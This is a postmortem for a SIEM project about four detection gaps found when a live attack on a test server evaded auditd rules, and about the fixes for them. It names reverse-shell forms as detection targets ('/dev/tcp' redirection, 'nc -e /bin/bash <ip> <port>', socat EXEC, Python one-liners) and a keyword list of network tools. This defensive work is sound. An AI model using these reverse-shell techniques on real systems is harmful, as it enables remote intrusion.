# Detection Gap Postmortem — Live-Fire Findings (2026-07-11)

**Status:** Closed. All fixes merged to `Development` (PRs #43, #44, #45, #46, #47) and verified against real attacker traffic on `prod2`.

**Trigger:** A live red-team-style attack run against `prod2` (SSH brute force → systemd persistence → `/dev/tcp` and `nc -e` reverse shells) was expected to raise T1110, T1543, and T1059 alerts. Two separate rounds of live testing surfaced four distinct, previously-invisible detection gaps — none of which any existing fixture test had caught.

---

## 1. Executive summary

| # | Technique | What was broken | Why fixtures didn't catch it | Fix |
|---|---|---|---|---|
| 1 | T1543.002 (persistence) | Auditd never watched `/etc/systemd/system/` on real agents | Fixture events are hand-built dicts; they don't depend on whether the *real* agent's auditd config would ever produce the event | New execution-based rule + corrected install script (PR #43, #44) |
| 2 | T1059.004 (`/dev/tcp`/`/dev/udp`) | Keyword list only matched external binaries (curl/wget/nc/…) | No fixture existed for the bash-builtin form at all | Added `/dev/tcp/`, `/dev/udp/` to keyword list (PR #45) |
| 3 | T1059.004 (**all variants**, systemic) | `required_fields` demanded `user.name`, which real auditd events can *never* supply | Every fixture hand-supplied `user.name`; nothing exercised the real parser's output shape | Dropped the unused required field (PR #46) |
| 4 | T1059.004 (`nc -e`/`ncat -c`/`--exec`) | Condition required `process.name` to be a shell; netcat itself never is | No fixture modeled a network tool directly executing a shell (no shell parent at all) | Added an OR-branch keyed on `process.name in [nc, ncat, netcat]` (PR #47) |

Finding #3 is the most significant: it silently killed **all** production matching for this rule — not just the new `/dev/tcp` addition — for **over two months** (2026-05-04 to 2026-07-11), and would still be undiscovered today without a live-fire replay against the exact attack that motivated this investigation.

---

## 2. Timeline

- **2026-04-29** — `linux_t1059_shell_network_tool` first written. `user.name` included in `required_fields` from day one, but never referenced by the rule's `condition` or `risk_adjustment` — a copy-paste artifact from a rule template, not a deliberate design choice.
- **2026-04-30 → 2026-05-03** — Rule fires correctly on real `prod1` traffic multiple times. At this point `required_fields` is declared but **not enforced** anywhere in the engine — it's inert metadata.
- **2026-05-04** — Commit `81023a9` ("stabilize detection-as-code pipeline") adds a hard skip gate to `yaml_detection_engine.py`: any event missing a field listed in `required_fields` is skipped before condition evaluation ever runs, and tagged `SkippedDueToMissingFields`. Since `AuditdParser` never derives `user.name` from `auid` (it only ever reads a `username` key that raw auditd text never contains, or an SSH-log regex that doesn't apply to process-execution events), and the Go agent never sends a `username` field for any log type, **every real auditd-sourced event is missing `user.name` — permanently, structurally**. From this commit forward, `linux_t1059_shell_network_tool` goes dark on all real traffic. No error, no log line, no failed test — it simply stops matching, silently, forever.
- **2026-07-04** — Independent investigation (this session, earlier phase) traces a *different* two-week-old undetected T1543 persistence attack to a provisioning gap: the agent's install script never watched systemd unit directories, so the file-write-based persistence rule never received its input event at all. Fixed via a new execution-based rule (`systemctl enable`) plus an install-script correction.
- **2026-07-10/11** — User runs a live attack against `prod2` covering T1110, T1543, and T1059 (`/dev/tcp` and `nc -e` reverse shells). T1543 and T1110 alert correctly; T1059 does not, despite 12/12 fixture tests passing for the just-added `/dev/tcp` extension.
- Root-caused via direct database forensics (not assumption): pulled the real captured auditd SYSCALL/EXECVE fragments for the exact attack event, replayed them through the actual parser and engine inside the running container, and reproduced `missing_fields: ['user.name', 'host.name']`. Git-blamed the required-fields gate to `81023a9` and cross-referenced it against the historical alert timestamps (`prod1`'s last real T1059 alert: 2026-05-03 — one day before the gate landed).
- Fix merged (PR #46); re-verified against the real event live in the rebuilt container: match, risk_score 82, HIGH.
- Same forensic pass surfaced a second, structurally distinct gap: `nc -e /bin/bash <ip> <port>` also went unalerted, because the rule assumed a shell process always sits at the root of the match — never true for netcat's self-contained `-e` reverse shell. Fixed (PR #47).
- While verifying PR #47 live, a bug in the fix itself was caught before merge: the new netcat risk-scoring keyword `-c bash` is a literal substring of the `/dev/tcp` payload's own text (`bash -c bash -i`), causing score double-counting (97 instead of 82) and a misleading "Netcat-family" reason on pure-bash alerts. Fixed in the same PR by scoping the risk adjustment to `process.name`, mirroring the condition block's own gate.
- User re-ran the attack; all four techniques (T1110, T1543 ×2, T1059 ×2) alerted correctly in the live database.

---

## 3. Why detection had a hard time catching the attack

Three distinct root-cause categories emerged. None of them are "the rule logic was wrong" in the way a typical bug report implies — each is a mismatch between what the rule *assumes* about its input and what the real pipeline actually *produces or requires*.

### 3a. The event never reaches the rule at all (provisioning gap)
T1543's original miss wasn't a rule problem — it was an **input problem**. The file-write rule was correctly written and correctly enabled, but auditd on the real host was never configured to watch `/etc/systemd/system/`, so the event the rule needed simply didn't exist in the log stream. Two separate, uncoordinated provisioning mechanisms existed in the codebase (a dead Go-agent-side one gated behind an unused flag, and a live-but-incomplete install-script one), and neither was validated against what the rule actually required.

**Lesson:** a rule's correctness can never be verified in isolation from the telemetry pipeline that feeds it. A rule that matches perfectly in a unit test can still never fire in production if the upstream collector never emits the event.

### 3b. The rule's assumptions about attacker syntax were incomplete (keyword/condition gaps)
Both the `/dev/tcp` gap and the `nc -e` gap share this shape: the rule encoded one specific *pattern* of "shell + network tool" (a shell process piping into or invoking a separately-named network binary) and never considered that the two roles can collapse into a single process. Bash's `/dev/tcp` redirection is a language *built-in* — no external binary is ever invoked. Netcat's `-e` flag makes the network tool itself the shell-spawning process — no separate shell parent exists to match against. Both are well-documented, common real-world reverse-shell techniques; the rule's keyword/condition list simply hadn't been extended to cover them yet.

**Lesson:** MITRE technique coverage isn't binary. A rule "covering" T1059.004 can still miss entire attacker syntax families within that technique. Coverage needs to be evaluated per *syntax variant*, not per technique ID.

### 3c. The rule required a field its own data source can never supply (the systemic bug)
This is the deepest and most consequential finding. `required_fields` is meant to prevent rules from crashing or producing nonsense on incomplete events — but nothing in the schema or loader validates that a field a rule declares as *required* is actually *derivable* from the log source that rule targets. `user.name` was listed for a pure-auditd rule, but the auditd parser structurally never populates it (it only comes from an SSH-log-specific regex or a JSON field the Go agent never sends). The gate added on 2026-05-04 turned this latent, harmless inconsistency into a silent, total, permanent failure — and it was *invisible* precisely because fixture tests, by convention, hand-build convenient event dicts that always include every field a human author thought to type in.

**Lesson:** this is the one finding that isn't specific to this rule. Any rule, for any technique, that lists a required field the parser for its declared `log_source` can't actually populate has the exact same latent failure mode, waiting for the next "stabilization" pass to activate it silently. See §5 for the concrete mitigation.

---

## 4. Implementation approach for the fixes

1. **T1543 provisioning gap** — added `linux_t1543_002_systemd_enable_exec`, an *execution*-based rule (`systemctl enable [--now] <unit>`) that detects the persistence technique without depending on file-write auditing at all, so it degrades gracefully even if the watch-rule gap recurs on some future host. Separately corrected the actually-active install script to add the missing systemd directory watches, closing the input gap directly.
2. **`/dev/tcp`/`/dev/udp`** — extended the existing keyword list and added a dedicated risk-scoring signal, since built-in socket redirection is a near-zero-false-positive indicator on its own.
3. **`user.name` required field** — removed it from `required_fields` after confirming (via full-codebase grep) it was never referenced anywhere in the rule's actual matching or scoring logic — a zero-risk, surgical fix rather than the more invasive alternative of teaching the parser to synthesize a `user.name` from `auid` for every rule and every log type.
4. **`nc -e`/`ncat -c`/`--exec`** — added a second `condition` branch (`any:` of the original shell-piping branch, plus a new netcat-family branch keyed on `process.name`), rather than a new rule file, since it's the same underlying technique (T1059.004) and MITRE mapping — keeping detection logic for one technique in one place.
5. **Score double-count self-fix** — every new risk-scoring signal added during this investigation was checked for whether it could fire on an *unrelated* matched branch (the `/dev/tcp` payload's literal text colliding with the netcat keyword list). The fix pattern — wrapping the risk-adjustment block in the same `process.name` gate as its sibling condition branch — is directly reusable for any future OR-branch rule.

Every fix in this investigation was verified the same way, end to end, before being reported as done: fixture tests (both positive and false-positive guards) **and** a live replay of the *exact captured production event* through the actual running container's parser and detection engine — not just synthetic data. This caught the double-count bug before it ever reached `Development`.

---

## 5. How this informs upcoming MITRE technique coverage work

The `/detection/mitre` coverage matrix currently reports a technique as "covered" if an enabled rule exists mapping to it. This investigation shows that's an insufficient bar — a rule can be enabled, mapped, and 100% green on fixtures, while being **completely incapable of matching real data** for two straight months. Concrete recommendations for the roadmap:

1. **Add a required-fields provenance check to the rule loader/CI.** For each `log_source.service` a rule declares, maintain a small registry of which ECS-style fields that source's parser can *actually* populate (e.g., `auditd` → `process.*`, `host.name`, `user.id`, but *not* `user.name` unless the parser is later changed). Reject or warn on any rule whose `required_fields` includes a field outside that set — this is exactly the class of bug that hid for two months and would have been caught at rule-load time, not two months into production.
2. **Require at least one "real-shape" fixture per rule**, alongside the conventional hand-built ones — an event built from the *parser's actual output structure* for that rule's declared log source (including whatever fields that source structurally omits), not a convenient all-fields-present dict. This session's new tests for `linux_t1059_shell_network_tool` (`test_matches_real_auditd_event_with_no_user_name`, the exact-payload `/dev/tcp` and `nc -e` replay tests) are the template for this convention going forward.
3. **Generalize the "interpreter directly binds the socket" pattern to other technique families.** `/dev/tcp` (bash/zsh) and `nc -e` (netcat) are two instances of the same underlying idea: an interpreter or tool executes a shell *itself*, with no conventional shell-parent process to anchor a rule's `process.name` check on. The same gap almost certainly exists today, unverified, for:
   - `socat ... EXEC:/bin/bash` (explicitly deferred out of scope in PR #47 — different syntax shape, same category)
   - Python/Perl/PHP/Ruby one-liner reverse shells (T1059.006/.005/.007) — `python3 -c "...socket...subprocess..."` never spawns a matchable shell process either
   - `awk`, `telnet`, and other LOLBin reverse-shell one-liners documented in GTFOBins
   Each of these should get the same "any: [conventional-branch, tool-self-execs-branch]" condition treatment already proven out for T1059.004 in PR #47, before being marked as newly covered in the MITRE matrix.
4. **Treat live-fire replay as a release gate for new/changed detection rules**, not an optional nice-to-have. Every fix in this postmortem was caught, confirmed, or (in the double-count case) prevented from shipping *because* real captured telemetry was replayed through the live engine before merging — fixture-only verification would have shipped at least one more silently-broken rule.
5. **Distinguish "fixture-verified" from "live-fire-verified" in the coverage matrix itself.** A technique whose rule has only ever been exercised by hand-built fixtures carries meaningfully less assurance than one that's been proven against real captured attacker telemetry end-to-end through the actual parser and engine. Surfacing that distinction in `/detection/mitre` would make future gaps like this visible to whoever reviews coverage, rather than requiring another live incident to discover them.

---

## 6. Verification evidence

- PRs (all merged to `Development`): [#43](https://github.com/Pokokpisang/ifyp-OVS-Dual-SIEM-Centralized/pull/43) T1543 exec rule · [#44](https://github.com/Pokokpisang/ifyp-OVS-Dual-SIEM-Centralized/pull/44) install-script watch fix · [#45](https://github.com/Pokokpisang/ifyp-OVS-Dual-SIEM-Centralized/pull/45) `/dev/tcp`/`/dev/udp` · [#46](https://github.com/Pokokpisang/ifyp-OVS-Dual-SIEM-Centralized/pull/46) `user.name` required-field fix · [#47](https://github.com/Pokokpisang/ifyp-OVS-Dual-SIEM-Centralized/pull/47) `nc -e` + score-collision fix.
- Full backend suite (`app/tests/` + `app/detection/tests/`): 407 passed, 0 regressions, at time of the final merge.
- Live confirmation, `prod2`, alerts table (post-fix attack run): `linux_t1110_ssh_bruteforce` (LOW/MEDIUM), `linux_t1543_002_systemd_service_persistence` (MEDIUM), `linux_t1543_002_systemd_enable_exec` (CRITICAL), `linux_t1059_shell_network_tool` (CRITICAL, both the `/dev/tcp` and `nc -e` variants, each scoring 82 independently with no cross-contamination).
